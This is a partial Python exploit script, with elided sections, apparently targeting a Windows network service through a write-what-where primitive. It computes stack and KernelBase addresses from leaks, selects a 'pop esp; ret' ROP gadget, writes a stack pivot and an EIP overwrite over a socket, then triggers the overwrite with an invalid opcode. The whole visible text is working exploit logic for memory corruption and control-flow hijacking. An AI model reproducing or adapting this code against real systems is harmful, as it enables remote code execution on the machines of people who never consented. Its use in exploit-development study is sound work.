...
start_value = 0x26000 # Default 0x00. Set higher to speed up runs.
...
def main():
    ...
    buffer_address = stack_address + 0x55c5c
    print("Stack buffer for rop chain address: " + hex(buffer_address))

    eip_overwrite_address = stack_address + 0x62078
    print("Stack buffer for initial EIP overwrite: " + hex(eip_overwrite_address))

    esp_at_eip_overwrite_address = eip_overwrite_address + 0x8
    print("ESP location during initial EIP overwrite: " + hex(esp_at_eip_overwrite_address))
    ...
    kb_base = kb_address - 0xf6929
    print("KernelBase Address: " + hex(kb_address))
    print("KernelBase Base: " + hex(kb_base))

    eip = convert_kernel_base_address(kb_base, 0x100e1af4) # pop esp ; add esi,  [ebp+0x03] ; mov al, 0x01 ; ret ;

    print("Setting up stack pivot...")
    print("Writing stack pivot location " + hex(buffer_address) + " to esp location: " + hex(esp_at_eip_overwrite_address))
    write_dword_value(s, buffer_address, esp_at_eip_overwrite_address)
    print("Writing eip value " + hex(eip) + " at memory location: " + hex(eip_overwrite_address))
    write_dword_value(s, eip, eip_overwrite_address)

    print("Sending a bad command to see if the buffer persists...")
    send_invalid_opcode(s)
